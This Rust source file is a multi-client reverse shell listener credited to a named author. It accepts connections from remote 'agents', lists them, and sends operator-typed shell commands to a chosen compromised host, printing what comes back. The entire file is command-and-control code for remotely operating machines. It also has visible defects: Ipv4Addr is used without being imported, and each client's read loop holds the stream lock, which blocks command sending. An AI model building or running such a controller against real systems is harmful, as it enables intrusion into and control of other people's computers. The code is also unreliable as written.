use std::net::{TcpListener, TcpStream, SocketAddr, SocketAddrV4};
use std::io::{BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use std::thread;

struct ClientInfo {
    id: usize,
    agent_name: String,
    address: SocketAddr,
    stream: Arc<Mutex<TcpStream>>,
}

use clap::{Arg, Command};
fn main() {

    // CLI arguments.
    let matches = Command::new("Reverse Shell Server")
        .version("0.1")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Server")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("IP address to bind to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Port to bind to.")
                .required(true)
        )
    .get_matches();
  // Get IP address.
  let ipaddress = matches.get_one::<String>("IP").expect("IP address argument is required.");
 
  // Get port.
  let port: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");
 
  // Converting IP address to Ipv4Addr.
  // Update to provide on the CLI.
  let ip = match ipaddress.parse::<Ipv4Addr>() {
      Ok(ip) => ip,
      Err(e) => panic!("{}", e),
  };
    let bindaddress = SocketAddrV4::new(ip, port);
    let tcplistener = TcpListener::bind(bindaddress).expect("Could not bind");
    println!("Listening on: {:?}", tcplistener.local_addr().unwrap());

    // Shared list of clients
    let clients = Arc::new(Mutex::new(Vec::<ClientInfo>::new()));

    // Clone Arc for command handling thread
    let clients_for_commands = Arc::clone(&clients);

    // Spawn a thread to handle user commands
    thread::spawn(move || {
        let stdin = std::io::stdin();
        let mut input_line = String::new();

        loop {
            input_line.clear();
            print!("server> "); // prompt for user commands
            std::io::stdout().flush().unwrap();

            if stdin.read_line(&mut input_line).is_err() {
                eprintln!("Failed to read from stdin.");
                continue;
            }

            let line = input_line.trim();
            if line == "clients" {
                // Print the list of connected clients
                let lock = clients_for_commands.lock().unwrap();
                if lock.is_empty() {
                    println!("No clients connected.");
                } else {
                    println!("ID | Agent Name | Address");
                    println!("-------------------------");
                    for c in lock.iter() {
                        println!("{} | {} | {}", c.id, c.agent_name, c.address);
                    }
                }
            } else {
                // Maybe the user typed something like: "2 whoami"
                let mut parts = line.splitn(2, ' ');
                let id_str = parts.next().unwrap_or("");
                let cmd = parts.next().unwrap_or("");

                if let Ok(id) = id_str.parse::<usize>() {
                    let mut lock = clients_for_commands.lock().unwrap();
                    if let Some(client) = lock.iter_mut().find(|c| c.id == id) {
                        // Send command to this client
                        // Null-terminate as per your protocol
                        let mut cmd_to_send = cmd.to_string();
                        cmd_to_send.push('\0');

                        // Lock the client's stream and write
                        let mut stream = client.stream.lock().unwrap();
                        if let Err(e) = stream.write_all(cmd_to_send.as_bytes()) {
                            eprintln!("Failed to send command to client {}: {}", id, e);
                        } else {
                            println!("Command sent to client {}", id);
                        }
                    } else {
                        println!("No client with ID {} found.", id);
                    }
                } else {
                    println!("Unknown command. Type 'clients' to list clients.");
                }
            }
        }
    });

    // Start accepting clients in the main thread
    let mut next_id = 0;
    for stream_result in tcplistener.incoming() {
        match stream_result {
            Ok(client_stream) => {
                let client_address = client_stream.peer_addr().expect("No peer addr?");
                println!("[+] A client connected: {:?}", client_address);

                let clients_for_thread = Arc::clone(&clients);

                // Wrap the TcpStream in Arc<Mutex<...>> so we can store and share it
                let stream_arc = Arc::new(Mutex::new(client_stream));

                // We'll spawn a thread to handle reading from this client.
                let client_id = next_id;
                next_id += 1;

                let thread_stream_ref = Arc::clone(&stream_arc);

                // Spawn the client handling thread
                thread::spawn(move || {
                    // First: read the agent name from the client
                    {
                        let mut lock = thread_stream_ref.lock().unwrap();
                        let mut reader = BufReader::new(&*lock);
                        
                        let mut agent_buf = Vec::new();
                        // Assuming the client sends its agent name followed by '\0'
                        if let Err(e) = reader.read_until(b'\0', &mut agent_buf) {
                            eprintln!("Failed to read agent name from {:?}: {}", client_address, e);
                            return;
                        }
                        let agent_name = String::from_utf8_lossy(&agent_buf);
                        let agent_name = agent_name.trim_end_matches('\0').trim().to_string();

                        // Add this client to the global list
                        {
                            let mut clients_lock = clients_for_thread.lock().unwrap();
                            clients_lock.push(ClientInfo {
                                id: client_id,
                                agent_name: agent_name.clone(),
                                address: client_address,
                                stream: Arc::clone(&thread_stream_ref),
                            });
                        }

                        println!("Client {} identified as: {}", client_id, agent_name);
                    }

                    // Now we enter a loop to continuously read from the client
                    loop {
                        let mut lock = thread_stream_ref.lock().unwrap();
                        let mut reader = BufReader::new(&*lock);
                        let mut buf: Vec<u8> = Vec::new();
                        
                        let bytes_read = match reader.read_until(b'\0', &mut buf) {
                            Ok(b) => b,
                            Err(e) => {
                                eprintln!("Error reading from client {}: {}", client_id, e);
                                break;
                            }
                        };

                        if bytes_read == 0 {
                            // Client disconnected
                            println!("Client {} disconnected", client_id);
                            break;
                        }

                        let output = String::from_utf8_lossy(&buf);
                        let message = output.trim_end_matches('\0').trim();

                        println!("Received from client {}: \"{}\"", client_id, message);

                        if message == "exit" {
                            println!("Client {} requested exit.", client_id);
                            break;
                        }

                        // In this updated design, we do not prompt here.
                        // The main thread is responsible for sending commands using the ID.
                    }

                    // Cleanup on disconnect
                    {
                        let mut clients_lock = clients_for_thread.lock().unwrap();
                        if let Some(pos) = clients_lock.iter().position(|c| c.id == client_id) {
                            clients_lock.remove(pos);
                        }
                    }

                    let _ = thread_stream_ref.lock().unwrap().shutdown(std::net::Shutdown::Both);
                });
            }
            Err(e) => {
                eprintln!("Failed to accept connection: {}", e);
            }
        }
    }
}